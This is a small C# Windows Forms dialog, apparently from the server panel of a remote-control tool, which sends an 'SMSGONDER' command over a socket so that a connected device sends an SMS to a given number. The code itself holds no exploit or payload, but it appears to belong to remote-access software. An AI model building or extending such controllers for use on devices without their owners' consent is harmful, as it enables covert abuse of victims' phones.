using System;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class SMS : MetroFramework.Forms.MetroForm
    {
        Socket s;
        public SMS(Socket socket, string num, string name)
        {
            InitializeComponent();
            s = socket;
            metroTextBox1.Text = name;
            textBox1.Text = num;
            button1.Click += button1_Click;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text != "" && textBox2.Text != "")
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("SMSGONDER", Encoding.UTF8.GetBytes(textBox1.Text + "=" + textBox2.Text));
                    s.Send(senddata, 0, senddata.Length, SocketFlags.None);
                    MessageBox.Show("SMS request successfully sent.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex) { MessageBox.Show("SMS request couldn't sent:\n" + ex.Message, "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); }
                Close();
            }
        }
    }
}
